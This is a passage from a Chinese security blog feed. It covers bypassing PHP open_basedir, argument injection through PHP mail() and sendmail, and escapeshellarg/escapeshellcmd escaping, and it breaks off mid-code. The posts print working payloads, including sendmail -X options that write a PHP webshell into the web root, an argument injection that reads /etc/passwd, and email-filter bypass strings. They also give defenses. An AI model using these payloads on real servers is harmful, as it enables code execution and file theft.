class="line">$directorLister-&gt;setCurrentPath($cwd);</span><br><span class="line">$file_list = $directorLister-&gt;getFileList();</span><br><span class="line">$parent_path = dirname($cwd);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;li&gt;&lt;a href='?cwd=&#123;$parent_path&#125;&#123;$append&#125;#dl'&gt;Parent&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (count($file_list) &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($file_list <span class="keyword">as</span> $file) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;li&gt;&lt;a href='?cwd=&#123;$cwd&#125;&#123;$file&#125;&#123;$append&#125;#dl'&gt;&#123;$file&#125;&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'No files found. The path is probably not a directory.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/ol&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>试了下，简单的界面化了，但局限性非常明显，就是glob://伪协议的局限性：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/12.png" alt=""></p><h2 id="0x0A-参考"><a href="#0x0A-参考" class="headerlink" title="0x0A 参考"></a>0x0A 参考</h2><p><a href="http://ju.outofmemory.cn/entry/104785" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p><p><a href="https://www.jianshu.com/p/98535e6c54df" target="_blank" rel="noopener">通过chdir来bypass open_basedir</a></p><p><a href="https://www.4hou.com/web/17357.html" target="_blank" rel="noopener">从PHP底层看open_basedir bypass</a></p><p><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="noopener">php5全版本绕过open_basedir读文件脚本</a></p><p><a href="https://blog.csdn.net/niexinming/article/details/53146095" target="_blank" rel="noopener">绕过open_basedir读文件脚本</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP中mail()函数安全问题与防御</title>
    <link href="https://Mi1k7ea.github.com/2019/07/16/PHP%E4%B8%ADmail-%E5%87%BD%E6%95%B0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
    <id>https://Mi1k7ea.github.com/2019/07/16/PHP中mail-函数安全问题与防御/</id>
    <published>2019-07-16T14:23:52.000Z</published>
    <updated>2019-07-21T06:53:52.297Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-函数简介"><a href="#0x01-函数简介" class="headerlink" title="0x01 函数简介"></a>0x01 函数简介</h2><p>(PHP 4, PHP 5, PHP 7)</p><p>mail()函数允许您从脚本中直接发送电子邮件。如果邮件的投递被成功地接收，则返回 true，否则返回 false。</p><p>函数定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail ( string $to , string $subject , string $message [, mixed $additional_headers [, string $additional_parameters ]] ) : bool</span><br></pre></td></tr></table></figure><p>参数说明：</p><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">to</td><td style="text-align:left">必需。规定邮件的接收者。</td></tr><tr><td style="text-align:left">subject</td><td style="text-align:left">必需。规定邮件的主题。该参数不能包含任何换行字符。</td></tr><tr><td style="text-align:left">message</td><td style="text-align:left">必需。规定要发送的消息。</td></tr><tr><td style="text-align:left">additional_headers</td><td style="text-align:left">可选。规定额外的报头，比如 From, Cc 以及 Bcc。</td></tr><tr><td style="text-align:left">additional_parameters</td><td style="text-align:left">可选。规定 sendmail 程序的额外参数。</td></tr></tbody></table><p>在Linux系统上，mail()函数是默认调用sendmail程序发送邮件的。而这里我们看到，通过mail()函数的第五个参数即additional_parameters可以传递给发送程序sendmail额外参数。</p><p>发送一封简单的邮件的Demo代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$txt = <span class="string">"First line of text\nSecond line of text"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果一行大于 70 个字符，请使用 wordwrap()。</span></span><br><span class="line">$txt = wordwrap($txt,<span class="number">70</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送邮件</span></span><br><span class="line">mail(<span class="string">"somebody@example.com"</span>,<span class="string">"My subject"</span>,$txt);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-安全问题"><a href="#0x02-安全问题" class="headerlink" title="0x02 安全问题"></a>0x02 安全问题</h2><p>在PHP中，mail()函数无论是自身问题或者助攻其他漏洞方面都是出现很多它的身影的。</p><p>我们从参数开始说起，其实可以明显看到mail()函数的前三个必须的参数是不存在类似其他参数所存在的注入风险的，安全问题主要集中在后面两个参数。</p><h3 id="垃圾邮件发送"><a href="#垃圾邮件发送" class="headerlink" title="垃圾邮件发送"></a>垃圾邮件发送</h3><p>可控点：第一个参数to</p><p>要说在mail()函数的三个必须的参数中是否有安全风险，那就是第一个参数即to。</p><p>当to参数可由用户从外部输入来控制时，攻击者就可以利用to参数来设定受害者的邮箱来不断地发送垃圾邮件。对服务端本身危害不大，但值得注意。</p><h3 id="邮件头注入"><a href="#邮件头注入" class="headerlink" title="邮件头注入"></a>邮件头注入</h3><p>可控点：第四个参数additional_headers</p><p>前提条件：PHP 5.4.42 和 5.5.27 之前</p><p>我们知道additional_headers参数是用于添加额外的报头，由于邮件标题由CRLF换行符\r\n来分隔的，因此当未初始化第四个参数时，攻击者可以使用这些字符来附加其他电子邮件标题。此攻击称为电子邮件头注入（或短电子邮件注入）。通过向注入CC:或BCC:标头添加多个电子邮件地址来发送多个垃圾邮件可能会被滥用。</p><p>具体email头注入的示例可参考：<a href="https://resources.infosecinstitute.com/email-injection/" target="_blank" rel="noopener">PHP Email Injection Example [Updated 2018]</a></p><h3 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h3><p>可控点：第五个参数additional_parameters</p><p>我们知道，mail()函数的第五个参数即additional_parameters可以传递给发送程序sendmail额外参数。</p><p>sendmail是Linux中发送邮件的程序。在其额外参数中，支持主要选项有以下三种：</p><blockquote><ol><li><p>-O option = value<br>QueueDirectory = queuedir 选择队列消息</p></li><li><p>-X logfile<br>这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。</p></li><li><p>-f from email<br>这个参数可以让我们指定我们发送邮件的邮箱地址。</p></li><li><p>-C file</p><p>这个参数用File变量指定的备用配置文件启动sendmail命令。</p></li></ol></blockquote><h4 id="利用1——向Web目录写日志shell"><a href="#利用1——向Web目录写日志shell" class="headerlink" title="利用1——向Web目录写日志shell"></a>利用1——向Web目录写日志shell</h4><p>主要原理就是利用mail()第五个参数additional_parameters向sendmail程序发送额外参数-O QueueDirectory=queuedir和-X logfile，其中logfile即详细日志文件设置为Web目录中的PHP文件，而邮件中有部分内容设置为恶意PHP代码，当访问该文件时就会在Web目录生成PHP日志文件、其中详细记录包含了恶意PHP代码，再访问该PHP日志文件即可触发恶意代码执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$to = <span class="string">"mi1k@7ea.com"</span>;</span><br><span class="line">$subject = <span class="string">"hhhhhh"</span>;</span><br><span class="line">$message = <span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line">$headers = <span class="string">"CC: alan@7ea.com"</span>;</span><br><span class="line">$options = <span class="string">"-O QueueDirectory=/tmp -X /var/www/html/log-shell.php"</span>;</span><br><span class="line">mail($to, $subject, $message, $headers, $options);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问该文件后，过段时间（等sendmail程序反应）查看在当前Web目录生成了log-shell.php文件，其中包含我们输入的php代码：</p><p><img src="/2019/07/16/PHP中mail-函数安全问题与防御/1.png" alt=""></p><p>直接访问log-shell.php即可触发代码执行：</p><p><img src="/2019/07/16/PHP中mail-函数安全问题与防御/2.png" alt=""></p><h4 id="利用2——读取任意文件内容"><a href="#利用2——读取任意文件内容" class="headerlink" title="利用2——读取任意文件内容"></a>利用2——读取任意文件内容</h4><p>看个参数注入原意为向指定输入邮箱发送mail.txt文件内容，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">system(<span class="string">"/usr/sbin/sendmail -t -i -f"</span>.escapeshellcmd($_GET[c]).<span class="string">' &lt; mail.txt'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用-C参数选项读取任意文件内容，输入<a href="mailto:payload`a@b.com" target="_blank" rel="noopener">payload`a@b.com</a> -C/etc/passwd -X/tmp/output.txt`：</p><p><img src="/2019/07/16/PHP中mail-函数安全问题与防御/3.png" alt=""></p><h3 id="escapeshellarg-逃逸"><a href="#escapeshellarg-逃逸" class="headerlink" title="escapeshellarg()逃逸"></a>escapeshellarg()逃逸</h3><p>对于第五个参数addiional_parameters外部可控即存在参数注入的问题，有小伙伴会通过调用escapeshellarg()来对addiional_parameters参数进行过滤，但是由于在mail()函数的源码中是会调用escapeshellcmd()函数来过滤addiional_parameters参数的，从而导致了escapeshellarg&gt;escapeshellcmd参数注入，逃逸了escapeshellarg()的过滤。</p><p>具体原理和Demo参考：<a href="https://www.mi1k7ea.com/2019/07/04/浅谈escapeshellarg与参数注入/" target="_blank" rel="noopener">《浅谈escapeshellarg逃逸与参数注入》</a></p><p>受该漏洞影响的一些扩展应用组件信息如下表：</p><table><thead><tr><th>Application</th><th>Version</th><th>Reference</th></tr></thead><tbody><tr><td>Roundcube</td><td>&lt;= 1.2.2</td><td><a href="https://blog.ripstech.com/2016/roundcube-command-execution-via-email/" target="_blank" rel="noopener">CVE-2016-9920</a></td></tr><tr><td>MediaWiki</td><td>&lt; 1.29</td><td><a href="https://phabricator.wikimedia.org/T152717" target="_blank" rel="noopener">Discussion</a></td></tr><tr><td>PHPMailer</td><td>&lt;= 5.2.18</td><td><a href="https://github.com/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities" target="_blank" rel="noopener">CVE-2016-10033</a></td></tr><tr><td>Zend Framework</td><td>&lt; 2.4.11</td><td><a href="https://framework.zend.com/security/advisory/ZF2016-04" target="_blank" rel="noopener">CVE-2016-10034</a></td></tr><tr><td>SwiftMailer</td><td>&lt;= 5.4.5-DEV</td><td><a href="https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html" target="_blank" rel="noopener">CVE-2016-10074</a></td></tr><tr><td>SquirrelMail</td><td>&lt;= 1.4.23</td><td><a href="https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html" target="_blank" rel="noopener">CVE-2017-7692</a></td></tr></tbody></table><h3 id="不安全的FILTER-VALIDATE-EMAIL"><a href="#不安全的FILTER-VALIDATE-EMAIL" class="headerlink" title="不安全的FILTER_VALIDATE_EMAIL"></a>不安全的FILTER_VALIDATE_EMAIL</h3><p>有些程序员会将第五个参数additional_parameters通过调用FILTER_VALIDATE_EMAIL过滤器来进行email地址的校验，但是仅仅靠FILTER_VALIDATE_EMAIL来实现防御还是存在安全问题的。</p><p>下面先看下几个基本概念。</p><h4 id="filter-var-函数"><a href="#filter-var-函数" class="headerlink" title="filter_var()函数"></a>filter_var()函数</h4><p>(PHP 5 &gt;= 5.2.0, PHP 7)</p><p>filter_var() 函数通过指定的过滤器过滤一个变量。如果成功，则返回被过滤的数据。如果失败，则返回 FALSE。</p><p>函数定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">variable</td><td style="text-align:left">必需。规定要过滤的变量。</td></tr><tr><td style="text-align:left">filter</td><td style="text-align:left">可选。规定要使用的过滤器的 ID。默认是 FILTER_SANITIZE_STRING。参见 <a href="https://www.runoob.com/php/php-ref-filter.html" target="_blank" rel="noopener">完整的 PHP Filter 参考手册</a>，查看可能的过滤器。过滤器 ID 可以是 ID 名称（比如 FILTER_VALIDATE_EMAIL）或 ID 号（比如 274）。</td></tr><tr><td style="text-align:left">options</td><td style="text-align:left">可选。规定一个包含标志/选项的关联数组或者一个单一的标志/选项。检查每个过滤器可能的标志和选项。</td></tr></tbody></table><p>可以看到，该函数第二个参数是可以设置指定过滤器的，其中对于email地址的过滤可以设置FILTER_VALIDATE_EMAIL过滤器。</p><h4 id="FILTER-VALIDATE-EMAIL过滤器"><a href="#FILTER-VALIDATE-EMAIL过滤器" class="headerlink" title="FILTER_VALIDATE_EMAIL过滤器"></a>FILTER_VALIDATE_EMAIL过滤器</h4><p>FILTER_VALIDATE_EMAIL过滤器把值作为email地址来验证。</p><p>示例Demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$email = <span class="string">"someone@exa mple.com"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!filter_var($email, FILTER_VALIDATE_EMAIL))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"E-mail is not valid"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"E-mail is valid"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="安全缺陷"><a href="#安全缺陷" class="headerlink" title="安全缺陷"></a>安全缺陷</h4><blockquote><p>关于 <strong>filter_var()</strong> 中 <strong>FILTER_VALIDATE_EMAIL</strong> 这个选项作用，我们可以看看这个帖子 <a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly" target="_blank" rel="noopener">PHP FILTER_VALIDATE_EMAIL</a> 。这里面有个结论引起了我的注意： <strong>none of the special characters in this local part are allowed outside quotation marks</strong> ，表示所有的特殊符号必须放在双引号中。 <strong>filter_var()</strong> 问题在于，我们能够在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 <strong>filter_val()</strong> 使其认为我们仍然在双引号中，我们就可以绕过检测。</p></blockquote><p>我们写个简单的例子就知道：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(filter_var(<span class="string">'\'is."\'\ not\ allowed"@example.com'</span>, FILTER_VALIDATE_EMAIL));</span><br><span class="line">var_dump(filter_var(<span class="string">'"is.\ not\ allowed"@example.com'</span>, FILTER_VALIDATE_EMAIL));</span><br><span class="line">var_dump(filter_var(<span class="string">'"is.""\ not\ allowed"@example.com'</span>, FILTER_VALIDATE_EMAIL));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/07/16/PHP中mail-函数安全问题与防御/4.png" alt=""></p><p>可以看到，这样就能逃逸出FILTER_VALIDATE_EMAIL来输入单引号和空格等字符了，进而可以结合其他漏洞打出组合拳进行高阶利用。</p><h3 id="助攻disable-functions绕过"><a href="#助攻disable-functions绕过" class="headerlink" title="助攻disable_functions绕过"></a>助攻disable_functions绕过</h3><h4 id="Bash破壳漏洞"><a href="#Bash破壳漏洞" class="headerlink" title="Bash破壳漏洞"></a>Bash破壳漏洞</h4><p>具体原理和示例可看：<a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/" target="_blank" rel="noopener">浅谈几种Bypass disable_functions的方法</a></p><p>这里简单说下mail()函数为啥进行了助攻：因为mail()函数的第五个参数additional_parameters在mail.c的源码中会直接拼接成一条新的命令然后传入popen()中执行，当目标系统存在Bash破壳漏洞时，攻击者就可以借助mail()函数来注入第五个参数从而实现disable_functions的绕过。</p><h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4><p>具体原理和示例可看：<a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/" target="_blank" rel="noopener">浅谈几种Bypass disable_functions的方法</a></p><p>这里简单说下mail()函数为啥进行了助攻：我们知道这种方法绕过disable_functions主要是通过劫持某个函数如getuid()或劫持启动进程来实现的，而调用mail()函数会启动进程或调用系统sendmail程序，进而调用getuid()函数从而实现劫持，最终导致disable_functions被绕过。</p><h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p>当然，以上列的只是常见的遇到，外国佬研究的比较深，有多个新的攻击利用向量可以借鉴，具体的看文章就好：</p><p>原文：<a href="https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html" target="_blank" rel="noopener">Pwning PHP mail() function For Fun And RCE</a></p><p>翻译版：<a href="https://www.anquanke.com/post/id/86028" target="_blank" rel="noopener">详细解析PHP mail()函数漏洞利用技巧</a></p><h2 id="0x03-防御方法"><a href="#0x03-防御方法" class="headerlink" title="0x03 防御方法"></a>0x03 防御方法</h2><p>对于直接的mail()函数的问题，主要针对几个参数进行防御：</p><ul><li>to参数：除非特定场景，一般不让用户从外部输入；</li><li>subject参数：安全使用；</li><li>message参数：安全使用；</li><li>headers参数：若用户可从外部输入，则过滤\r和\n字符，防御CRLF注入；</li><li>parameters参数：尽量不使用用户输入，实在不行要按照业务场景进行严格过滤；</li></ul><p>对于由mail()间接助攻引起的一系列问题，需按业务场景来规划：</p><ul><li>如果非必需，直接disable_functions禁用掉；</li><li>如果业务需要，不用或严格过滤第五个参数，起到点缓解的作用；</li></ul><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php/" target="_blank" rel="noopener">Why mail() is dangerous in PHP</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>浅谈escapeshellarg逃逸与参数注入</title>
    <link href="https://Mi1k7ea.github.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/"/>
    <id>https://Mi1k7ea.github.com/2019/07/04/浅谈escapeshellarg与参数注入/</id>
    <published>2019-07-04T14:54:41.000Z</published>
    <updated>2019-07-17T15:49:18.980Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg()"></a>escapeshellarg()</h3><blockquote><p>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7)</p><p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数。</p><p>函数定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; escapeshellarg ( string $arg ) : string</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。</p></blockquote><p>简单地说，如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。</p><p>看个例子就知道了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(escapeshellarg($_GET[p]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先输入字符串mi1k7ea，看到escapeshellarg()会给该字符串整个加上单引号括起来，加起来总共9个字符：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/1.png" alt=""></p><p>输入mi1k’7ea，看到先转义了中间这个单引号，再分别在左右两边加上单引号括起来，加起来总共13个字符：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/2.png" alt=""></p><p>该函数正确使用的Demo，这样可有效从参数位置防御命令注入漏洞，也是参数注入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">'ls '</span>.escapeshellarg($dir));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a>escapeshellcmd()</h3><blockquote><p>(PHP 4, PHP 5, PHP 7)</p><p>escapeshellcmd — shell 元字符转义。</p><p>函数定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; escapeshellcmd ( string $command ) : string</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p></blockquote><p>简单地说，第一，如果输入内容中上述出现的特殊字符会被反斜杠给转义掉；第二，如果单引号和双引号不是成对出现时，会被转义掉。</p><p>看个例子就知道了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(escapeshellcmd($_GET[p]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入mi1k7ea，其中不包含以上特殊字符的字符串，是不会添加单引号括起来的，内容不变：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/3.png" alt=""></p><p>输入’mi1k’7ea’;字符串，由于前面两个单引号成对了因此没有对其进行转义，而最后的单引号没有成对因此被转义掉，除此之外分号作为特殊字符也被转义处理：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/4.png" alt=""></p><p>该函数正确使用的Demo，这样能确保用户只执行一个命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 我们故意允许任意数量的参数</span></span><br><span class="line">$command = <span class="string">'./configure '</span>.$_POST[<span class="string">'configure_options'</span>];</span><br><span class="line"></span><br><span class="line">$escaped_command = escapeshellcmd($command);</span><br><span class="line"> </span><br><span class="line">system($escaped_command);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h3><p>前面已经说了，这里再列下比较一下。</p><p>PHP对于命令注入漏洞提供了escapeshellarg()和escapeshellcmd()两个函数来进行防御，当然两者针对的场景有区别。</p><p><strong>escapeshellarg</strong></p><p>主要是为了防止用户的输入逃逸出“参数值”的位置，变成一个“参数选项”。</p><p>处理过程：如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。</p><p>场景功能：</p><blockquote><p>1.确保用户只传递一个参数给命令</p><p>2.用户不能指定更多的参数一个</p><p>3.用户不能执行不同的命令</p></blockquote><p><strong>escapeshellcmd</strong></p><p>主要是防止用户利用shell的一些技巧（如分号、管道符、反引号等）来进行命令注入攻击。</p><p>处理过程：如果输入内容中&amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF等特殊字符会被反斜杠给转义掉；如果单引号和双引号不是成对出现时，会被转义掉。</p><p>场景功能：</p><blockquote><p>1.确保用户只执行一个命令</p><p>2.用户可以指定不限数量的参数</p><p>3.用户不能执行不同的命令</p></blockquote><h3 id="mail-与sendmail"><a href="#mail-与sendmail" class="headerlink" title="mail()与sendmail"></a>mail()与sendmail</h3><p>后续列出的CVE漏洞涉及到这两个概念，这里提下。</p><p><strong>mail()</strong></p><p>函数定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool mail (</span><br><span class="line">    string $to ,</span><br><span class="line">    string $subject ,</span><br><span class="line">    string $message [,</span><br><span class="line">    string $additional_headers [,</span><br><span class="line">    string $additional_parameters ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>其参数含义分别表示如下：</p><blockquote><ul><li>to，指定邮件接收者，即接收人</li><li>subject，邮件的标题</li><li>message，邮件的正文内容</li><li>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li><li>additional_parameters，指定传递给发送程序sendmail的额外参数。</li></ul></blockquote><p>在Linux系统上，mail()函数是默认调用sendmail程序发送邮件的。而这里我们看到，通过mail()函数的第五个参数即additional_parameters可以传递给发送程序sendmail额外参数。</p><p><strong>sendmail</strong></p><p>sendmail是Linux中发送邮件的程序。在其额外参数中，支持主要选项有以下三种：</p><blockquote><ol><li>-O option = value<br>QueueDirectory = queuedir 选择队列消息</li><li>-X logfile<br>这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。</li><li>-f from email<br>这个参数可以让我们指定我们发送邮件的邮箱地址。</li></ol></blockquote><p><strong>写shell利用示例</strong></p><p>看个示例就知道怎么通过mail()向sendmail添加额外参数来写shell了。</p><p>主要原理就是利用mail()第五个参数additional_parameters向sendmail程序发送额外参数-O QueueDirectory=queuedir和-X logfile，其中logfile即详细日志文件设置为Web目录中的PHP文件，而邮件中有部分内容设置为恶意PHP代码，当访问该文件时就会在Web目录生成PHP日志文件、其中详细记录包含了恶意PHP代码，再访问该PHP日志文件即可触发恶意代码执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$to = <span class="string">"mi1k@7ea.com"</span>;</span><br><span class="line">$subject = <span class="string">"hhhhhh"</span>;</span><br><span class="line">$message = <span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line">$headers = <span class="string">"CC: alan@7ea.com"</span>;</span><br><span class="line">$options = <span class="string">"-O QueueDirectory=/tmp -X /var/www/html/log-shell.php"</span>;</span><br><span class="line">mail($to, $subject, $message, $headers, $options);</span><br><span class="line"><span 